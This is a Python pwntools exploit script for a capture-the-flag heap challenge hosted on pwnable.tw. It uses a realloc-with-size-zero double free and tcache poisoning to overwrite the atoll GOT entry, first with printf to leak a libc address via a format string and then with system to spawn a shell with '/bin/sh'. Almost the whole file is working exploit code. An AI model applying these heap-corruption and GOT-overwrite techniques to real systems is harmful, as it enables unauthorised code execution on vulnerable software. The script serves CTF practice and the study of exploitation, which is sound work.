#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     gdbscript="""
#     b *main+111
#     b *main+123
#     b *main+135
# """,
# )  # x/2gx &heap
p = remote("chall.pwnable.tw", "10106")


def Allocate(index, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendlineafter(b"Data:", data)


def Reallocate(index, size, data=""):
    if size == 0:
        size = len(data)
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    if size == 0:
        return
    else:
        p.sendlineafter(b"Data:", data)


def rFree(index):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"Index:", str(index).encode())


####### the first 0x20 tcache bins with ATOLL GOT addr
Allocate(1, 16, b"1" * 15)
# Double Free
Reallocate(1, 0)  # free(1) but not set heapArr[1] = 0
Reallocate(1, 16, p64(elf.got["atoll"]))
Allocate(0, 16, b"0" * 15)

# heap0 same is pointer heap1
Reallocate(1, 32, b"1" * 31)
rFree(1)  # set heap[1] = null

Reallocate(0, 32, b"0" * 31)
rFree(0)  # set heap[0] = null

####### the second 0x30 tcache bins with ATOLL GOT addr
Allocate(0, 32, b"0" * 31)
# Double Free
Reallocate(0, 0)  # free(0) but not set heapArr[0] = 0
Reallocate(0, 32, p64(elf.got["atoll"]))
Allocate(1, 32, b"0" * 31)

# heap0 same is pointer heap1
Reallocate(0, 64, b"0" * 63)
rFree(0)  # set heap[0] = null

Reallocate(1, 64, b"1" * 63)
rFree(1)  # set heap[1] = null
# Now we have 2 type t-cache size 0x20, 0x30 same pointer atoll GOT

# [leak] - write atoll => printf
# use t-cache 0x30
Allocate(0, 32, p64(elf.symbols["printf"]))
rFree("%21$p")

leak = p.recvline().strip()
libc_start_main = int(leak, 16) - 235
libc.address = libc_start_main - libc.symbols["__libc_start_main"]
system = libc.symbols["system"]
log.success("__libc_start_main+235: " + hex(libc_start_main + 235))
log.success("Libc base:             " + hex(libc.address))
log.success("system:                " + hex(system))
log.success("&heap:                 " + hex(elf.symbols["heap"]))

# [getShell] - write atoll[printf] => system
# use t-cache 0x20
# now 'atoll' is printf => value return is length string => size = b"1"*10 = 10
Allocate("", "1" * 10, p64(system))
rFree("/bin/sh")

p.interactive()
